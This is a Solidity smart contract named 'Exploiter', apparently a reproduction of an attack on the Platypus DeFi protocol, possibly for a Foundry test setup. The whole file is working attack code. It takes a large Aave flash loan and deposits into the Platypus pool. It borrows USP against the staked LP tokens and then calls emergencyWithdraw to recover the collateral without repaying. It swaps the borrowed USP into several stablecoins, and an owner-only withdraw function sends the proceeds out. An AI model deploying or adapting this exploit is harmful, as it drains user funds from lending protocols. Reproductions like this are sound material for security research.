// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.10;

import "./libraries/Constants.sol";
import { IERC20 } from "forge-std/interfaces/IERC20.sol";
import "./interfaces/IMasterPlatypusV4.sol";
import "./interfaces/IPlatypusPool.sol";
import "./interfaces/IPlatypusTreasure.sol";
import "./interfaces/IAaveFlashloan.sol";


contract Exploiter {

    IERC20 USDC = IERC20(Constants.USDC);
    IERC20 USP = IERC20(Constants.USP);
    IERC20 USDC_E = IERC20(Constants.USDC_E);
    IERC20 USDT = IERC20(Constants.USDT);
    IERC20 USDT_E = IERC20(Constants.USDT_E);
    IERC20 BUSD = IERC20(Constants.BUSD);
    IERC20 DAI_E = IERC20(Constants.DAI_E);
    IERC20 LPUSDC = IERC20(Constants.LPUSDC);
    PlatypusPool Pool = PlatypusPool(Constants.PLATYPUS_POOL);
    MasterPlatypusV4 Master = MasterPlatypusV4(Constants.PLATYPUS_MASTERPLATYPUSV4);
    PlatypusTreasure Treasure = PlatypusTreasure(Constants.PLATYPUS_TREASURE);
    IAaveFlashloan aaveV3 = IAaveFlashloan(Constants.AAVE_V3);

    address owner;
    
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function withdraw(address [] memory _addresses, address _to) external onlyOwner returns (bool) {
        for (uint256 i = 0; i < _addresses.length;) {
            IERC20 token = IERC20(_addresses[i]);
            uint256 tokenBalance = token.balanceOf(address(this));
            token.transfer(_to, tokenBalance);
            
            unchecked { ++i; }
        }

        return true;
    }

    function hello() external returns (bool) {
        
        uint256 amount = 44_000_000 * 1e6;

        aaveV3.flashLoanSimple(address(this), address(USDC), amount, new bytes(0), 0);

    }

    function  executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {

        USDC.approve(address(aaveV3), amount + premium);
        
        USDC.approve(address(Pool), amount);
        
        Pool.deposit(address(USDC), amount, address(this), block.timestamp); 
        
        uint256 LPUSDCAmount = LPUSDC.balanceOf(address(this));
        
        LPUSDC.approve(address(Master), LPUSDCAmount);
        
        Master.deposit(4, LPUSDCAmount); 
        
        PlatypusTreasure.PositionView memory Position = Treasure.positionView(address(this), address(LPUSDC));
        
        uint256 borrowAmount = Position.borrowLimitUSP;
        
        Treasure.borrow(address(LPUSDC), borrowAmount); 

        Master.emergencyWithdraw(4);

        LPUSDC.approve(address(Pool), LPUSDC.balanceOf(address(this)));
        
        Pool.withdraw(address(USDC), LPUSDC.balanceOf(address(this)), 0, address(this), block.timestamp); // withdraw USDC from LP-USDC
        
        swapUSPToOtherTokens();
        
        return true;
    }

    function swapUSPToOtherTokens() internal {
        USP.approve(address(Pool), 9_000_000 * 1e18);
        Pool.swap(address(USP), address(USDC), 2_500_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(USDC_E), 2_000_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(USDT), 1_600_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(USDT_E), 1_250_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(BUSD), 700_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(DAI_E), 700_000 * 1e18, 0, address(this), block.timestamp);
    }
}